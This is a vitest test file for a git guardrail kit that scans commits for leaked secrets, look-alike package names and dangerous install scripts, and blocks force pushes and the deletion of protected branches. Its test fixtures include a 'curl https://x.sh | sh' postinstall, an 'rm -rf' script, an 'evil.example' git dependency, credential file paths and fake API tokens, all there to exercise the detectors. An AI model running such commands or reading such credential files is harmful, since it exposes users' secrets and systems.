import { describe, expect, it } from "vitest";
import { decide, ROOT } from "../../../../tests/helpers/guard-ctx.ts";
import {
  ALLOW_MARKER,
  diffDependencies,
  dependencyFindings,
  editDistance,
  entropy,
  isSecretPath,
  parseAddedLines,
  report,
  runPrePush,
  runPreCommit,
  runScanRange,
  scanAdded,
  scanLine,
  scanText,
  typosquatSuspect,
  unusualSpec,
  type GitResult,
  type GitRunner,
} from "./git-checks.mjs";

// Fake credentials are assembled at run time so this file never holds a string that looks like a real one
// (the kit's own pre-commit scanner would otherwise flag its own tests).
const j = (...parts: string[]) => parts.join("");
const FAKE = {
  aws: j("AKIA", "IOSFODNN7", "EXAMPLE"),
  github: j("ghp_", "a".repeat(10), "B".repeat(10), "c".repeat(10), "D".repeat(10)),
  slack: j("xox", "b-", "123456789012-abcdefghij"),
  stripe: j("sk_", "live_", "A1b2C3d4E5f6G7h8"),
  google: j("AIza", "SyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q"),
  npm: j("npm_", "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"),
  anthropic: j("sk-", "ant-", "api03-abcdefghijklmnopqrstuvwx"),
  openai: j("sk-", "proj-", "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0"),
  jwt: j("eyJ", "hbGciOiJIUzI1NiJ9", ".eyJ", "zdWIiOiIxMjM0NTY3ODkwIn0", ".", "abcdefghijklmnop"),
  privateKey: j("-----BEGIN ", "RSA PRIVATE KEY-----"),
};

describe("scanLine: known credential formats", () => {
  it.each(Object.entries(FAKE))("detects %s", (key, secret) => {
    const hits = scanLine(`const x = "${secret}";`);
    expect(hits.length, key).toBeGreaterThan(0);
  });

  it("names what it found without ever returning the value", () => {
    const hits = scanLine(FAKE.aws);
    expect(hits).toEqual([{ id: "aws-access-key", name: "AWS access key ID" }]);
    expect(JSON.stringify(hits)).not.toContain(FAKE.aws);
  });

  it("honours the allow marker", () => {
    expect(scanLine(`${FAKE.aws} // ${ALLOW_MARKER}`)).toEqual([]);
  });
});

describe("scanLine: generic assignments", () => {
  const key = j("api", "_key");
  it("flags a random-looking hard-coded secret", () => {
    expect(scanLine(`${key} = "Zk3pQ9xV7mL2nR8tB5wY1cH6"`).map((h) => h.id)).toContain("hardcoded-secret");
    expect(scanLine(`password: "Xy7!Qp2Lm9Rt4Wz8Kc3N"`.replace("!", "")).map((h) => h.id)).toContain("hardcoded-secret");
  });

  it.each([
    `${key} = "your-api-key-here-please"`,
    `${key} = "changeme-changeme-changeme"`,
    `password = "example-password-value1"`,
    `secret: "\${SECRET_FROM_ENV_VARIABLE}"`,
    `const token = process.env.API_TOKEN`,
    `password = "aaaaaaaaaaaaaaaaaaaaaaaa"`,
    `secret = "<paste secret here please>"`,
    `${key} = ""`,
    `${key} = "short"`,
  ])("ignores %s", (line) => {
    expect(scanLine(line)).toEqual([]);
  });

  it("flags passwords in database URLs but not placeholders", () => {
    expect(scanLine("DATABASE_URL=postgres://app:Zk3pQ9xV7mL2@db.internal/app").map((h) => h.id)).toContain("database-url-password");
    expect(scanLine("postgres://user:password@localhost:5432/db")).toEqual([]);
    expect(scanLine("redis://default:${REDIS_PASSWORD}@cache:6379")).toEqual([]);
    expect(scanLine("mongodb://admin:admin@localhost/db")).toEqual([]);
  });

  it("does not trip on ordinary code, hashes or integrity strings", () => {
    for (const line of [
      "const sum = a + b;",
      "sha256: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
      'integrity "sha512-Zk3pQ9xV7mL2nR8tB5wY1cH6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=="',
      "export const API_KEY_HEADER = 'x-api-key';",
      "// see https://example.com/docs",
      "git commit -m 'fix'",
    ]) {
      expect(scanLine(line), line).toEqual([]);
    }
  });
});

describe("scanText and entropy", () => {
  it("reports line numbers", () => {
    const text = ["ok", "still ok", `key=${FAKE.github}`, "", `${FAKE.aws}`].join("\n");
    expect(scanText(text).map((f) => f.line)).toEqual([3, 5]);
  });

  it("measures randomness", () => {
    expect(entropy("")).toBe(0);
    expect(entropy("aaaaaaaa")).toBe(0);
    expect(entropy("Zk3pQ9xV7mL2nR8tB5wY")).toBeGreaterThan(4);
  });
});

describe("isSecretPath", () => {
  const cases: Array<[string, boolean]> = [
    [".env", true], [".env.local", true], ["src/.env.production", true], [".env.example", false], [".env.sample", false],
    ["server.pem", true], ["keys/private.key", true], ["id_rsa", true], ["id_rsa.pub", false], ["id_ed25519", true],
    [".ssh/config", true], [".netrc", true], [".pgpass", true], [".git-credentials", true], ["README.md", false],
    ["src/environment.ts", false], ["package.json", false], [".gnupg/pubring.kbx", true], [".aws/credentials", true],
    [".aws/config", false], ["cert.p12", true], ["store.jks", true], ["envfile", false],
  ];
  it.each(cases)("%s -> %s", (file, expected) => {
    expect(isSecretPath(file)).toBe(expected);
  });

  it("agrees with the guard's own secret-file rule on every path", () => {
    for (const [file] of cases) {
      const guardSays = decide({ tool_name: "Read", tool_input: { file_path: `${ROOT}/${file}` }, cwd: ROOT }).rule === "secret-file";
      expect(guardSays, file).toBe(isSecretPath(file));
    }
  });
});

describe("diff parsing and scanning", () => {
  const diff = [
    "diff --git a/src/a.ts b/src/a.ts",
    "--- a/src/a.ts",
    "+++ b/src/a.ts",
    "@@ -3,0 +4,2 @@ context",
    "+const ok = 1;",
    `+const k = "${FAKE.aws}";`,
    "-removed line",
    "diff --git a/old.txt b/old.txt",
    "--- a/old.txt",
    "+++ /dev/null",
    "@@ -1,2 +0,0 @@",
    "-gone",
    "diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml",
    "--- a/pnpm-lock.yaml",
    "+++ b/pnpm-lock.yaml",
    "@@ -1 +1 @@",
    `+  token: ${FAKE.github}`,
  ].join("\n");

  it("collects the added lines with their new line numbers", () => {
    const files = parseAddedLines(diff);
    expect(files.map((f) => f.path)).toEqual(["src/a.ts", "pnpm-lock.yaml"]);
    expect(files[0]?.lines).toEqual([
      { n: 4, text: "const ok = 1;" },
      { n: 5, text: `const k = "${FAKE.aws}";` },
    ]);
  });

  it("finds secrets in added lines only, and skips lockfiles", () => {
    const result = scanAdded(parseAddedLines(diff), ["src/a.ts", ".env"]);
    expect(result.findings).toEqual([{ path: "src/a.ts", line: 5, id: "aws-access-key", name: "AWS access key ID" }]);
    expect(result.secretFiles).toEqual([".env"]);
  });

  it("handles empty and binary diffs", () => {
    expect(parseAddedLines("")).toEqual([]);
    expect(parseAddedLines("Binary files a/x.png and b/x.png differ")).toEqual([]);
  });
});

describe("typosquat check", () => {
  it.each([
    ["lodahs", "lodash"], ["loadash", "lodash"], ["exress", "express"], ["reactt", "react"], ["axois", "axios"],
    ["crossenv", "cross-env"], ["react_dom", "react-dom"], ["reactdom", "react-dom"], ["typescirpt", "typescript"],
    ["momnet", "moment"], ["expresss", "express"],
  ])("flags %s as a look-alike of %s", (name, similar) => {
    expect(typosquatSuspect(name)).toBe(similar);
  });

  it.each(["lodash", "react", "preact", "zod", "@types/node", "@scope/thing", "my-internal-lib", "ab", "vue", "leftpad-utils", "some-new-package"])(
    "leaves %s alone",
    (name) => {
      expect(typosquatSuspect(name)).toBeNull();
    },
  );

  it("measures edits, counting a swap as one", () => {
    expect(editDistance("lodash", "lodahs")).toBe(1);
    expect(editDistance("abc", "abc")).toBe(0);
    expect(editDistance("kitten", "sitting")).toBe(3);
    expect(editDistance("", "abc")).toBe(3);
  });
});

describe("dependency changes", () => {
  const before = { dependencies: { react: "^18.0.0" }, scripts: { build: "tsc", postinstall: "node setup.js" } };

  it("finds new dependencies, source changes and install scripts", () => {
    const after = {
      dependencies: { react: "^18.0.0", lodahs: "^4.0.0", mine: "github:me/mine", other: "^1.0.0" },
      devDependencies: { vitest: "^1.0.0" },
      scripts: { build: "tsc", postinstall: "curl https://x.sh | sh", prepare: "husky" },
    };
    const diff = diffDependencies(before, after);
    expect(diff.added.map((d) => d.name).sort()).toEqual(["lodahs", "mine", "other", "vitest"]);
    expect(diff.scripts).toEqual([
      { name: "postinstall", body: "curl https://x.sh | sh", dangerous: true },
      { name: "prepare", body: "husky", dangerous: false },
    ]);

    const found = dependencyFindings("package.json", diff);
    expect(found.errors.join("\n")).toMatch(/postinstall.*deletes files or downloads/);
    expect(found.warnings.join("\n")).toMatch(/new dependencies: .*lodahs/);
    expect(found.warnings.join("\n")).toMatch(/"lodahs" looks like a misspelling of "lodash"/);
    expect(found.warnings.join("\n")).toMatch(/"mine" installs from outside the registry/);
    expect(found.warnings.join("\n")).toMatch(/"prepare" script runs on every install/);
  });

  it("is quiet when nothing relevant changed", () => {
    const same = diffDependencies(before, { ...before, scripts: { ...before.scripts, build: "tsc -p ." } });
    expect(same.added).toEqual([]);
    expect(same.scripts).toEqual([]);
    expect(dependencyFindings("package.json", same)).toEqual({ errors: [], warnings: [] });
  });

  it("notices a version switched to a git or URL source", () => {
    const diff = diffDependencies({ dependencies: { a: "^1.0.0" } }, { dependencies: { a: "git+https://evil.example/a.git" } });
    expect(diff.changedSpecs.map((d) => d.name)).toEqual(["a"]);
  });

  it("handles missing sections and odd shapes", () => {
    expect(diffDependencies(null, {})).toEqual({ added: [], changedSpecs: [], scripts: [] });
    expect(diffDependencies({}, { dependencies: "nope", scripts: [] }).added).toEqual([]);
  });

  it.each([
    ["^1.0.0", false], ["1.2.3", false], ["latest", false], ["workspace:*", false], ["npm:other@1", false],
    ["github:a/b", true], ["git+https://x/y.git", true], ["https://x/y.tgz", true], ["file:../x", true], ["user/repo", true], ["user/repo#main", true],
  ])("unusualSpec(%s) = %s", (spec, expected) => {
    expect(unusualSpec(spec)).toBe(expected);
  });
});

/** A fake git: answers from a table keyed by the arguments joined with spaces. */
function fakeGit(table: Record<string, Partial<GitResult>>): GitRunner {
  return (args) => ({ code: 0, stdout: "", stderr: "", ...table[args.join(" ")] });
}

describe("runPreCommit", () => {
  const diffOf = (path: string, line: string) => `--- a/${path}\n+++ b/${path}\n@@ -0,0 +1 @@\n+${line}\n`;

  it("passes a clean commit", () => {
    const git = fakeGit({
      "diff --cached --name-only --diff-filter=ACMR -z": { stdout: "src/a.ts\0" },
      "diff --cached -U0 --no-color --diff-filter=ACMR": { stdout: diffOf("src/a.ts", "const a = 1;") },
    });
    expect(runPreCommit(git)).toEqual({ errors: [], warnings: [] });
  });

  it("blocks a staged secret file and a staged secret value", () => {
    const git = fakeGit({
      "diff --cached --name-only --diff-filter=ACMR -z": { stdout: ".env\0src/a.ts\0" },
      "diff --cached -U0 --no-color --diff-filter=ACMR": { stdout: diffOf("src/a.ts", `key = "${FAKE.github}"`) },
    });
    const result = runPreCommit(git);
    expect(result.errors).toContain(".env: is a secret or credentials file and must not be committed.");
    expect(result.errors.some((e) => e.startsWith("src/a.ts:1: looks like a GitHub token"))).toBe(true);
    expect(JSON.stringify(result)).not.toContain(FAKE.github);
  });

  it("warns about new dependencies without blocking, and blocks a dangerous install script", () => {
    const names = { "diff --cached --name-only --diff-filter=ACMR -z": { stdout: "package.json\0" } };
    const safe = runPreCommit(
      fakeGit({
        ...names,
        "show :package.json": { stdout: JSON.stringify({ dependencies: { lodahs: "^1.0.0" } }) },
        "show HEAD:package.json": { stdout: JSON.stringify({}) },
      }),
    );
    expect(safe.errors).toEqual([]);
    expect(safe.warnings.join("\n")).toMatch(/lodahs/);

    const bad = runPreCommit(
      fakeGit({
        ...names,
        "show :package.json": { stdout: JSON.stringify({ scripts: { postinstall: "rm -rf ~/x" } }) },
        "show HEAD:package.json": { stdout: JSON.stringify({}) },
      }),
    );
    expect(bad.errors.join("\n")).toMatch(/postinstall/);
  });

  it("handles a brand-new package.json and one that is not valid JSON", () => {
    const names = { "diff --cached --name-only --diff-filter=ACMR -z": { stdout: "package.json\0" } };
    const fresh = runPreCommit(fakeGit({ ...names, "show :package.json": { stdout: JSON.stringify({ dependencies: { zod: "^3" } }) }, "show HEAD:package.json": { code: 128 } }));
    expect(fresh.errors).toEqual([]);
    expect(fresh.warnings.join("\n")).toMatch(/new dependencies: zod@\^3/);
    const broken = runPreCommit(fakeGit({ ...names, "show :package.json": { stdout: "{ nope" } }));
    expect(broken.warnings.join("\n")).toMatch(/not valid JSON/);
  });

  it("warns when a lockfile changed without package.json", () => {
    const git = fakeGit({ "diff --cached --name-only --diff-filter=ACMR -z": { stdout: "pnpm-lock.yaml\0" } });
    expect(runPreCommit(git).warnings.join("\n")).toMatch(/pnpm-lock\.yaml changed but no package\.json did/);
  });
});

describe("runPrePush", () => {
  const SHA = (c: string) => c.repeat(40);
  const ZEROS = "0".repeat(40);
  const line = (local: string, remote: string) => `refs/heads/main ${local} refs/heads/main ${remote}\n`;

  it("allows a fast-forward with clean commits", () => {
    const git = fakeGit({
      [`rev-list ${SHA("b")}..${SHA("a")}`]: { stdout: `${SHA("c")}\n` },
      [`show --format= -U0 --no-color --diff-filter=ACMR ${SHA("c")}`]: { stdout: "--- a/x\n+++ b/x\n@@ -0,0 +1 @@\n+fine\n" },
    });
    expect(runPrePush(git, line(SHA("a"), SHA("b")))).toEqual({ errors: [], warnings: [] });
  });

  it("blocks a non-fast-forward push (force push)", () => {
    const git = fakeGit({ [`merge-base --is-ancestor ${SHA("b")} ${SHA("a")}`]: { code: 1 } });
    const result = runPrePush(git, line(SHA("a"), SHA("b")));
    expect(result.errors[0]).toMatch(/not a fast-forward/);
  });

  it("blocks when the remote's commit is unknown locally, because history cannot be proven safe", () => {
    const git = fakeGit({ [`cat-file -e ${SHA("b")}^{commit}`]: { code: 1 } });
    expect(runPrePush(git, line(SHA("a"), SHA("b"))).errors[0]).toMatch(/not a fast-forward/);
  });

  describe("deleting remote refs", () => {
    const deleting = (ref: string, git = fakeGit({})) => runPrePush(git, `(delete) ${ZEROS} ${ref} ${SHA("b")}\n`);

    it("allows deleting an ordinary feature branch", () => {
      expect(deleting("refs/heads/feature/login")).toEqual({ errors: [], warnings: [] });
    });

    it.each(["main", "master", "develop", "trunk", "release/1.2", "release-2", "hotfix/urgent"])("blocks deleting %s", (name) => {
      expect(deleting(`refs/heads/${name}`).errors[0]).toMatch(/would delete it on the remote/);
    });

    it("blocks deleting the branch origin/HEAD points to, whatever it is called", () => {
      const git = fakeGit({ "symbolic-ref --short refs/remotes/origin/HEAD": { stdout: "origin/stable\n" } });
      expect(deleting("refs/heads/stable", git).errors[0]).toMatch(/default branch/);
      expect(deleting("refs/heads/other", git).errors).toEqual([]);
    });

    it("blocks deleting tags and refs that are not branches", () => {
      expect(deleting("refs/tags/v1.0.0").errors[0]).toMatch(/tags/);
      expect(deleting("refs/pull/7/head").errors[0]).toMatch(/kind of ref/);
      expect(deleting("refs/notes/commits").errors).toHaveLength(1);
    });

    it("only protects exact branch names, not names that merely start with main", () => {
      expect(deleting("refs/heads/maintenance").errors).toEqual([]);
      expect(deleting("refs/heads/mainline-fix").errors).toEqual([]);
    });
  });

  it("scans the commits of a new branch for secrets", () => {
    const git = fakeGit({
      [`rev-list ${SHA("a")} --not --remotes`]: { stdout: `${SHA("c")}\n` },
      [`diff-tree --no-commit-id --name-only -r --diff-filter=ACMR -z ${SHA("c")}`]: { stdout: "src/k.ts\0.env\0" },
      [`show --format= -U0 --no-color --diff-filter=ACMR ${SHA("c")}`]: { stdout: `--- a/src/k.ts\n+++ b/src/k.ts\n@@ -0,0 +1 @@\n+k="${FAKE.slack}"\n` },
    });
    const result = runPrePush(git, line(SHA("a"), ZEROS));
    expect(result.errors.join("\n")).toMatch(/commit cccccccc: \.env: is a secret/);
    expect(result.errors.join("\n")).toMatch(/commit cccccccc: src\/k\.ts:1: looks like a Slack token/);
  });

  it("ignores blank lines and stops reading at malformed ones", () => {
    expect(runPrePush(fakeGit({}), "\n\nnot enough fields\n")).toEqual({ errors: [], warnings: [] });
  });
});

describe("runScanRange", () => {
  it("scans the diff of a range and compares package.json against the merge base", () => {
    const git = fakeGit({
      "diff --no-color -U0 --diff-filter=ACMR origin/main...HEAD": { stdout: `--- a/a.ts\n+++ b/a.ts\n@@ -0,0 +1 @@\n+${FAKE.aws}\n` },
      "diff --name-only --diff-filter=ACMR -z origin/main...HEAD": { stdout: "a.ts\0package.json\0" },
      "merge-base origin/main HEAD": { stdout: "abc123\n" },
      "show HEAD:package.json": { stdout: JSON.stringify({ dependencies: { lodahs: "1" } }) },
      "show abc123:package.json": { stdout: "{}" },
    });
    const result = runScanRange(git, "origin/main...HEAD");
    expect(result.errors.join("\n")).toMatch(/a\.ts:1: looks like a AWS access key ID/);
    expect(result.warnings.join("\n")).toMatch(/lodahs/);
  });

  it("reports a range git cannot diff", () => {
    const git = fakeGit({ "diff --no-color -U0 --diff-filter=ACMR nope": { code: 128, stderr: "bad revision" } });
    expect(runScanRange(git, "nope").errors[0]).toMatch(/could not diff nope: bad revision/);
  });
});

describe("report", () => {
  it("lists warnings, blocks with a reason and a hint, and says nothing when all is well", () => {
    expect(report("commit", { errors: [], warnings: [] })).toBe("");
    const text = report("commit", { errors: ["a.ts:1: looks like a Slack token."], warnings: ["package.json: new dependencies: x@1."] });
    expect(text).toContain("agent-guardrails: warning: package.json: new dependencies");
    expect(text).toContain("agent-guardrails: commit BLOCKED");
    expect(text).toContain("  - a.ts:1: looks like a Slack token.");
    expect(text).toContain(ALLOW_MARKER);
    expect(text).toMatch(/AI agent must ask first/);
  });
});
